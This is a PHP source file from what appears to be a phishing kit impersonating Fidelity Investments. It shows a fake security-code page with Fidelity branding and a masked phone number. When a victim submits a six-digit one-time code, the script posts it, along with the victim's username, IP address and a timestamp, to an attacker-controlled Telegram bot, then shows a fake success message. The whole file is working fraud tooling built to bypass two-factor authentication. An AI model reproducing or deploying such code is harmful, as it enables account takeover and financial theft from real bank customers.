<?php
session_start();
header('Content-Type: text/html; charset=UTF-8');

include 'config.php';

$error = '';
$success = false;

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function sendTelegramMessage($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

$username = $_SESSION['fidelity_username'] ?? 'Unknown';
$phone = $_SESSION['fidelity_phone'] ?? 'XXXX';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
    
    if (!empty($otp) && preg_match('/^\d{6}$/', $otp)) {
        $ip = getUserIP();
        
        $message = "🔢 <b>OTP Code Received</b>\n\n";
        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔐 <b>OTP Code:</b> <code>" . htmlspecialchars($otp) . "</code>\n";
        $message .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
        $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . " UTC\n";
        
        sendTelegramMessage($botToken, $chatId, $message);
        
        $success = true;
    } else {
        $error = 'Please enter a valid 6-digit code.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Code - Fidelity</title>
    <link rel="stylesheet" href="assets/fonts.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Fidelity Sans', Arial, sans-serif;
            background: #fff;
            color: #000;
            min-height: 100vh;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem 2rem;
            border-bottom: 1px solid #ccc;
        }
        
        .header-logo img {
            height: 30px;
        }
        
        .header-links {
            display: flex;
            gap: 1.5rem;
        }
        
        .header-links a {
            color: #006fba;
            text-decoration: none;
            font-size: 14px;
        }
        
        .header-links a:hover {
            text-decoration: underline;
        }
        
        .container {
            max-width: 480px;
            margin: 40px auto;
            padding: 0 20px;
        }
        
        .login {
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 32px;
        }
        
        .login-title {
            font-size: 1.5rem;
            font-weight: 300;
            margin-bottom: 12px;
        }
        
        .sub-text {
            display: block;
            color: #666;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        
        .error-box {
            display: <?php echo $error ? 'flex' : 'none'; ?>;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            padding: 16px;
            border-radius: 8px;
            border: 2px solid #DC1616;
            background: #FFF5F5;
            color: #DC1616;
        }
        
        .success-box {
            display: <?php echo $success ? 'block' : 'none'; ?>;
            text-align: center;
            padding: 40px 20px;
        }
        
        .success-box svg {
            width: 64px;
            height: 64px;
            margin-bottom: 20px;
        }
        
        .success-box h2 {
            color: #368727;
            font-size: 1.5rem;
            font-weight: 300;
            margin-bottom: 12px;
        }
        
        .success-box p {
            color: #666;
            font-size: 14px;
        }
        
        label {
            display: block;
            font-size: 1rem;
            font-weight: 400;
            margin-top: 20px;
            margin-bottom: 8px;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #888;
            border-radius: 8px;
            font-size: 16px;
            font-family: inherit;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: #000;
            box-shadow: 0 0 0 2px #000;
        }
        
        input[type="text"].error {
            border-color: #DC1616;
        }
        
        button {
            width: 100%;
            margin-top: 24px;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: #368727;
            color: #fff;
            font-size: 16px;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        button:hover {
            background: #2B6B1E;
        }
        
        .form-box {
            display: <?php echo $success ? 'none' : 'block'; ?>;
        }
        
        @media (max-width: 511px) {
            .header {
                padding: 0.75rem 1rem;
            }
            
            .container {
                margin-top: 0;
            }
            
            .login {
                border: 0;
                border-radius: 0;
                border-bottom: 1px solid #ccc;
                padding: 22px 17px 24px;
            }
        }
    </style>
</head>
<body>
<header class="header">
    <div class="header-logo">
        <a href="#">
            <img src="assets/Fidelity-wordmark.svg" alt="Fidelity Investments">
        </a>
    </div>
    <div class="header-links">
        <a href="#">Security</a>
        <a href="#">FAQs</a>
    </div>
</header>

<div class="container">
    <div class="login">
        <div class="success-box" id="successBox">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="12" cy="12" r="10" stroke="#368727" stroke-width="2" fill="none"/>
                <path d="M8 12l3 3 5-6" stroke="#368727" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
            </svg>
            <h2>Verification Successful</h2>
            <p>Thank you for verifying your identity. You may now close this window.</p>
        </div>
        
        <div class="form-box" id="formBox">
            <h1 class="login-title">Enter the code we just sent to your phone</h1>
            <span class="sub-text">We sent the code to (XXX) XXX-<?php echo htmlspecialchars($phone); ?>. It will expire after 30 minutes.</span>
            
            <div class="error-box" id="errorBox">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="currentColor"/>
                </svg>
                <span><?php echo htmlspecialchars($error); ?></span>
            </div>
            
            <form method="POST" action="" id="otpForm">
                <label for="code">Security code</label>
                <input type="text" id="code" name="otp" placeholder="XXXXXX" maxlength="6" autocomplete="off" pattern="\d{6}" required>
                <button type="submit">Submit</button>
            </form>
        </div>
    </div>
</div>

<script>
    var otpInput = document.getElementById('code');
    var otpForm = document.getElementById('otpForm');
    var errorBox = document.getElementById('errorBox');
    
    otpInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length > 6) {
            e.target.value = e.target.value.slice(0, 6);
        }
        if (errorBox) {
            errorBox.style.display = 'none';
        }
        otpInput.classList.remove('error');
    });
    
    otpForm.addEventListener('submit', function(e) {
        var code = otpInput.value.trim();
        if (!/^\d{6}$/.test(code)) {
            e.preventDefault();
            otpInput.classList.add('error');
            errorBox.style.display = 'flex';
            errorBox.querySelector('span').textContent = 'Please enter a valid 6-digit code.';
            return false;
        }
    });
    
    otpInput.focus();
</script>
</body>
</html>